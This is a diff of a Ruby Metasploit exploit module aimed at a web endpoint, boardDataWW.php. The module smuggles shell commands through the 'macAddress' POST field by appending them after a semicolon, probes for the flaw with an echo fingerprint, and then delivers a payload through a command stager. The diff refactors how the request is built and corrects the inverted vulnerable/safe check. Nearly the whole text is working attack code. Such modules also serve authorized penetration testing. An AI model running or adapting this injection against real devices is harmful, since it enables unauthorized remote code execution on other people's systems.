@@ -47,24 +47,24 @@ class MetasploitModule < Msf::Exploit::Remote
       ))
       register_options(
       [
-        OptString.new('TARGETURI', [true, 'Path of the vulnerable URI.', 'boardDataWW.php']),
-        OptString.new('MAC_ADDRESS', [true, 'MAC address to use (default: random)', rand_text_numeric(12)])
+        OptString.new('TARGET_URI', [true, 'Path of the vulnerable URI.', '/boardDataWW.php']), # boardDataWW.php
+        OptString.new('MAC_ADDRESS', [true, 'MAC address to use (default: random)', Rex::Text.rand_text_hex(12)])
       ])
   end
 
-  def filter_bad_chars(cmd)
-    cmd.gsub!(/chmod \+x/, 'chmod 777')
-    cmd.gsub!(/;/, ' %26%26 ')
-    cmd.gsub!(/ /, '+')
-  end
-
   # post request
-  def request_post(command, targeturi, mac_addr)
+  def request_post(command) # request_post(command, target_uri, mac_addr)
+    vars_post = {
+      'macAddress' => "#{datastore['MAC_ADDRESS']};#{command};",
+      'reginfo' => '1',
+      'writeData' => 'Submit'
+    }
+
     send_request_cgi({
     'method'  => 'POST',
     'headers' => { 'Connection' => 'Keep-Alive' },
-    'uri'     => normalize_uri('/', "#{targeturi}"),
-    'data'    => "macAddress=#{mac_addr};#{filter_bad_chars(command)};&reginfo=1&writeData=Submit\r\n"
+    'uri'     => "#{datastore['TARGET_URI']}",
+    'vars_post' => vars_post
     })
   rescue ::Rex::ConnectionError
     fail_with(Failure::Unreachable, "#{peer} - Failed to connect to the target!")
@@ -72,8 +72,8 @@ class MetasploitModule < Msf::Exploit::Remote
 
   # check for vulnerability existence
   def check
-    fingerprint = "echo DEADBEEF31337" # if vulnerability is present, we will get this back in the response
-    res = request_post(fingerprint, datastore['TARGETURI'], datastore['MAC_ADDRESS']) # the raw POST response
+    fingerprint = "DEADBEEF31337" # If vulnerability is present, we will get this back in the response
+    res = request_post("echo #{fingerprint}") # the raw POST response
 
     unless res
       vprint_error 'Connection failed'
@@ -85,14 +85,14 @@ class MetasploitModule < Msf::Exploit::Remote
     end
 
     unless res.get_html_document.at('input').to_s.include? fingerprint
-      return CheckCode::Vulnerable
+      return CheckCode::Safe
     end
 
-    CheckCode::Safe
+    CheckCode::Vulnerable
   end
 
   def execute_command(cmd, opts = {})
-    request_post(cmd, datastore['TARGETURI'], datastore['MAC_ADDRESS'])
+    request_post(cmd)
   end
 
   # the exploit method
@@ -101,7 +101,7 @@ class MetasploitModule < Msf::Exploit::Remote
     unless [CheckCode::Vulnerable].include? check
       fail_with Failure::NotVulnerable, 'Target is most likely not vulnerable!'
     end
-
+    
     execute_cmdstager(linemax: 2048) # maximum 130,000
   end
 
